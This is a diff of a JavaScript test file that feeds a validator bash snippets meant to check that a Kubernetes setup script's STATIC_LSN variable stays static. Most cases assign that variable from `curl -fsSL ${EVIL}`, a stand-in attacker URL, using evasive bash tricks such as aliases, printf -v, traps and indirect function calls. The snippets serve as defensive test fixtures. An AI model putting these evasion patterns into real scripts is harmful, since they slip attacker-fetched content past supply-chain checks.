@@ -820,7 +820,7 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
     'a name assembled from a backslash': `read -r STATIC_LS\\N < <(curl -fsSL ${EVIL})`,
     'positional parameters rewritten by set': `set -- "$(curl -fsSL ${EVIL})"; STATIC_LSN="$1"`,
     'a helper that assigns from $1, never called statically': 'setlsn() { STATIC_LSN="$1"; }',
-    'a helper that assigns from $1, dispatched through a variable': `setlsn() { STATIC_LSN="$1"; }; h=setlsn; "$h" "$(curl -fsSL ${EVIL})"`,
+    'a helper that assigns from $1, dispatched through a variable': `setlsn() { STATIC_LSN="$1"; }\nh=setlsn\n"$h" "$(curl -fsSL ${EVIL})"`,
     'an alias for read': `shopt -s expand_aliases; alias rd=read; rd -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
     'printf -v': `printf -v STATIC_LSN "%s" "$(curl -fsSL ${EVIL})"`,
     'printf -vNAME (attached)': `printf -vSTATIC_LSN "%s" "$(curl -fsSL ${EVIL})"`,
@@ -846,7 +846,7 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
     let: 'let STATIC_LSN=1',
     'arithmetic assignment': '(( STATIC_LSN = 1 ))',
     'wait -p': 'sleep 0 & wait -p STATIC_LSN',
-    '{V}> fd binding': 'exec {STATIC_LSN}>/dev/null',
+    '{V}> fd binding (even on an external command)': 'sleep 0 {STATIC_LSN}>/dev/null',
     'a run-time command ($cmd V)': `cmd=read; $cmd -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
     'a write AFTER the statement (loop order)': `trap 'read -r STATIC_LSN < <(curl -fsSL ${EVIL})' EXIT`,
   };
